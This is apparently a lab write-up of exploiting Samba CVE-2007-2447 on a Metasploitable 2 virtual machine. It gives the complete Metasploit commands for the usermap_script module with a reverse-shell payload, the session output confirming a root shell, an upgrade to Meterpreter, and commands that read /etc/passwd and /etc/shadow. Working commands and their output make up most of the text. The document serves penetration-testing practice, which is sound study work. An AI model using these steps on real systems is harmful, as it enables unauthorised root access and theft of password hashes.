# Metasploit Exploitation

Metasploitable 2 – Exploitation Report (Samba CVE-2007-2447)

1. Launch Metasploit

msfconsole

2. Select the Samba Usermap Script Exploit

This module exploits the command execution vulnerability in Samba (CVE-2007-2447).

use exploit/multi/samba/usermap_script
set RHOSTS 192.168.101.129
set LHOST 192.168.101.130
set PAYLOAD cmd/unix/reverse

3. Run the Exploit

A reverse shell is created successfully.

run
[*] Started reverse TCP double handler on 192.168.101.130:4444
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command shell session 1 opened (192.168.101.130:4444 -> 192.168.101.129:60375)

4. Verify Active Sessions

sessions

Active sessions
===============
  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix   root        192.168.101.130:4444 -> 192.168.101.129:60375

5. Interact With the Shell

sessions -i 1
whoami
root

The exploitation is successful — we have a remote shell with root privileges.

6. Upgrade to Meterpreter

To gain post-exploitation features, the shell is upgraded.

sessions -u 1
[*] Upgrading session ID: 1
[*] Meterpreter session 3 opened

7. Verify Meterpreter Session

sessions

Active sessions
===============
  1   shell
  3   meterpreter x86/linux  root @ metasploitable.localdomain

8. Post-Exploitation Commands

- System Information

sessions -i 3
meterpreter > sysinfo
meterpreter > getuid

- Extract /etc/passwd
meterpreter > cat /etc/passwd


<img width="1151" height="692" alt="image" src="https://github.com/user-attachments/assets/8671f5b9-ce19-47fc-baeb-03599423defc" />

- Extract /etc/shadow
meterpreter > cat /etc/shadow


<img width="1067" height="755" alt="image" src="https://github.com/user-attachments/assets/1023820a-03a8-43a7-8fc8-a0ab468f3313" />

Conclusion

The Metasploitable 2 instance (192.168.101.129) was successfully exploited using the Samba username map script vulnerability (CVE-2007-2447).
A root shell was obtained, upgraded to Meterpreter, and full post-exploitation access was achieved including:

System information

User identity

/etc/passwd extraction

/etc/shadow extraction

File system access

This confirms complete system compromise.
